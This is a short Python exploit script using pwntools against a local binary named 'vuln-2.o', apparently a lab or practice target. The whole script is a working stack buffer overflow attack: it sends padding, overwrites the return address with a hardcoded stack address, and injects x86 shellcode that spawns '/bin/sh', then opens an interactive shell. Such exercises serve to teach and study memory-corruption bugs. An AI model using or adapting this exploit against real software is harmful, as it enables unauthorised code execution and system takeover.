#!/usr/bin/env python3

from pwn import *

p = process('./vuln-2.o')

padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGG"

buf_addres = 0xffffd1d0

eip = buf_addres + len(padding) + 4

shellcode = """ 
    xor ecx, ecx
    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    mov al, 11
    int 0x80
 """

send = padding + p32(eip) + asm(shellcode)

p.sendline(send)

p.interactive()
